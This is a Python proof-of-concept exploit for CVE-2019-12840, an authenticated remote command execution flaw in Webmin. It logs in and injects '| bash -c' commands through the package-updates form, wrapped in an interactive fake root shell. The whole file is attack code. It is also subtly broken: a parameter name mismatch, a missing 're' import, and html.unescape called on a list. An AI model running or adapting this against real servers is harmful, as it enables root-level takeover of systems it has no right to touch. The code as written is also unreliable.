#!/usr/bin/python3

"""
#####################################################
		POC: CVE-2019-12840

	Fake Shell in python3 (Authenticated RCE)
#####################################################
"""

import requests
import urllib3
import html

# Variables
webmin_url = "https://127.0.0.1/session_login.cgi"
package_url = "https://127.0.0.1/package-updates/update.cgi"

def exploit(comando):

    urllib3.disable_warnings()
    session = requests.session()
    session.verify = False

    headers = {
        'Cookie':'testing=1'
        }

    data = {
        'page':'',
        'user':'USERNAME',
        'pass':'PASSWORD'
        }

    r = session.post(webmin_url, data=data, headers=headers)

    data = [
        ('u', 'acl/apt'),
        ('u', command),
        ('ok_top', 'Update Selected Packages')
        ]

    headers = {
        'Referer':'https://127.0.0.1/'
        }

    r = session.post(package_url, data=data, headers=headers)

    command = html.unescape(re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL))[0].strip()
    print(command)
    
if __name__=='__main__':

    command = "zzz"
    while command != exit:
    	command = input("root@webmin ~#  ")
    	command = f' | bash -c "{command}"'
    	exploit(command)

